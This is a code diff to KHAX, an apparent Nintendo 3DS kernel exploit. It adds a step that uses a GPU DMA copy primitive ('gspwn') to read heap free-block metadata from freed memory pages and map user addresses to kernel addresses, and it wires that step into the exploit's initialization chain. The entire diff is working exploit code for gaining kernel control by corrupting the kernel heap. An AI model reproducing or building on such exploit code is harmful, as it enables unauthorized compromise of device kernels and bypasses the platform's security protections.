@@ -79,6 +79,8 @@ namespace KHAX
 		Result Step2_AllocateMemory();
 		// Free the second and fourth pages of the five.
 		Result Step3_SurroundFree();
+		// Verify that the freed heap blocks' data matches our expected layout.
+		Result Step4_VerifyExpectedLayout();
 
 	private:
 		// Version information.
@@ -114,6 +116,15 @@ namespace KHAX
 		};
 		OverwriteMemory *m_overwriteMemory;
 		unsigned m_overwriteAllocated;
+
+		// Additional linear memory buffer for temporary purposes.
+		union ExtraLinearMemory
+		{
+			ALIGN(64) unsigned char m_bytes[64];
+			// When interpreting as a HeapFreeBlock.
+			HeapFreeBlock m_freeBlock;
+		};
+		ExtraLinearMemory *m_extraLinear;
 	};
 
 	//------------------------------------------------------------------------------------------------
@@ -122,8 +133,8 @@ namespace KHAX
 	enum : Result { KHAX_MODULE = 254 };
 	// Check whether this system is a New 3DS.
 	Result IsNew3DS(bool *answer, u32 kernelVersionAlreadyKnown = 0);
-	// Simple gspwn copy, not using any fancy looping.
-	Result SimpleGSPwn(void *dest, const void *src, std::size_t size, s64 waitNanoseconds);
+	// Inverted gspwn, meant for reading from freed buffers.
+	Result InverseGSPwn(void *dest, const void *src, std::size_t size, s64 waitNanoseconds);
 }
 
 
@@ -269,6 +280,16 @@ Result KHAX::MemChunkHax::Step2_AllocateMemory()
 		return MakeError(26, 7, KHAX_MODULE, 1009);
 	}
 
+	// Allocate extra memory that we'll need.
+	m_extraLinear = static_cast<ExtraLinearMemory *>(linearMemAlign(sizeof(*m_extraLinear),
+		alignof(m_extraLinear)));
+	if (!m_extraLinear)
+	{
+		KHAX_printf("Step2:failed extra alloc\n");
+		return MakeError(26, 3, KHAX_MODULE, 1011);
+	}
+	KHAX_printf("Step2:extra=%p\n", m_extraLinear);
+
 	// OK, we're good here.
 	++m_nextStep;
 	return 0;
@@ -331,6 +352,50 @@ Result KHAX::MemChunkHax::Step3_SurroundFree()
 }
 
 //------------------------------------------------------------------------------------------------
+// Verify that the freed heap blocks' data matches our expected layout.
+Result KHAX::MemChunkHax::Step4_VerifyExpectedLayout()
+{
+	if (m_nextStep != 4)
+	{
+		KHAX_printf("MemChunkHax: Invalid step number %d for Step4_VerifyExpectedLayout\n", m_nextStep);
+		return MakeError(28, 5, KHAX_MODULE, 1016);
+	}
+
+	// Copy the first freed page (third page) out to read its heap metadata.
+	std::memset(m_extraLinear, 0xCC, sizeof(*m_extraLinear));
+
+	if (Result result = InverseGSPwn(m_extraLinear, &m_overwriteMemory->m_pages[2],
+		sizeof(*m_extraLinear), 10000000))
+	{
+		KHAX_printf("Step4:invgspwn failed:%08lx\n", result);
+		return result;
+	}
+
+	// Debug information about the memory block
+	KHAX_printf("Step4:[2]u=%p k=%p\n", &m_overwriteMemory->m_pages[2], m_versionData->
+		ConvertLinearUserVAToKernelVA(&m_overwriteMemory->m_pages[2]));
+	KHAX_printf("Step4:[2]n=%p p=%p c=%d\n", m_extraLinear->m_freeBlock.m_next,
+		m_extraLinear->m_freeBlock.m_prev, m_extraLinear->m_freeBlock.m_count);
+
+	// Copy the second freed page (fifth page) out to read its heap metadata.
+	std::memset(m_extraLinear, 0xCC, sizeof(*m_extraLinear));
+
+	if (Result result = InverseGSPwn(m_extraLinear, &m_overwriteMemory->m_pages[4],
+		sizeof(*m_extraLinear), 10000000))
+	{
+		KHAX_printf("Step4:invgspwn failed:%08lx\n", result);
+		return result;
+	}
+
+	KHAX_printf("Step4:[4]u=%p k=%p\n", &m_overwriteMemory->m_pages[4], m_versionData->
+		ConvertLinearUserVAToKernelVA(&m_overwriteMemory->m_pages[4]));
+	KHAX_printf("Step4:[4]n=%p p=%p c=%d\n", m_extraLinear->m_freeBlock.m_next,
+		m_extraLinear->m_freeBlock.m_prev, m_extraLinear->m_freeBlock.m_count);
+
+	return 1;
+}
+
+//------------------------------------------------------------------------------------------------
 // Free memory and such.
 KHAX::MemChunkHax::~MemChunkHax()
 {
@@ -350,6 +415,12 @@ KHAX::MemChunkHax::~MemChunkHax()
 				KHAX_printf("free %u: %08lx\n", x, res);
 			}
 		}
+	}
+
+	// Free the extra linear memory.
+	if (m_extraLinear)
+	{
+		linearFree(m_extraLinear);
 	}
 }
 
@@ -400,21 +471,35 @@ Result KHAX::IsNew3DS(bool *answer, u32 kernelVersionAlreadyKnown)
 }
 
 //------------------------------------------------------------------------------------------------
-// Simple gspwn copy, not using any fancy looping.
-Result KHAX::SimpleGSPwn(void *dest, const void *src, std::size_t size, s64 waitNanoseconds)
+// Inverted gspwn, meant for reading from freed buffers.
+Result KHAX::InverseGSPwn(void *dest, const void *src, std::size_t size, s64 waitNanoseconds)
 {
-	// This is some black magic that I don't totally understand.
+	// Attempt a flush of the source, but ignore the result, since we may have just been asked to
+	// read unmapped memory or something similar.
 	GSPGPU_FlushDataCache(nullptr, static_cast<u8 *>(const_cast<void *>(src)), size);
-	Result result = GX_SetTextureCopy(nullptr, static_cast<u32 *>(const_cast<void *>(src)), 0,
-		static_cast<u32 *>(dest), 0, size, 8);
+
+	// Invalidate the destination's cache, since we're about to overwrite it.
+	if (Result result = GSPGPU_InvalidateDataCache(nullptr, static_cast<u8 *>(dest), size))
+	{
+		KHAX_printf("invgspwn:inval dest fail:%08lx\n", result);
+		return result;
+	}
+
+	if (Result result = GX_SetTextureCopy(nullptr, static_cast<u32 *>(const_cast<void *>(src)), 0,
+		static_cast<u32 *>(dest), 0, size, 8))
+	{
+		KHAX_printf("invgspwn:copy fail:%08lx\n", result);
+		return result;
+	}
 
 	// Yay for arbitrary delays.
 	svcSleepThread(waitNanoseconds);
 
-	return result;
+	return 0;
 }
 
 //------------------------------------------------------------------------------------------------
+// Main initialization function interface.
 extern "C" Result khaxInit()
 {
 	using namespace KHAX;
@@ -454,6 +539,11 @@ extern "C" Result khaxInit()
 	if (Result result = hax.Step3_SurroundFree())
 	{
 		KHAX_printf("khaxInit: Step3 failed: %08lx\n", result);
+		return result;
+	}
+	if (Result result = hax.Step4_VerifyExpectedLayout())
+	{
+		KHAX_printf("khaxInit: Step4 failed: %08lx\n", result);
 		return result;
 	}
 
